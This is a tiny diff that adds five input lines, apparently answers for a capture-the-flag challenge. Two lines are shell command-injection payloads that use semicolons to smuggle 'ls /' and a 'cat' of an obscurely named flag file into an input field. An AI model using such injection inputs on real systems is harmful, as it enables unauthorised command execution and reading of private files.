@@ -1,0 +1,5 @@
+f
+; ls / ; echo
+f
+f
+; cat /sup3r-0bscuR3-n@m3-0f_TH3_fl4g.txt ; echo
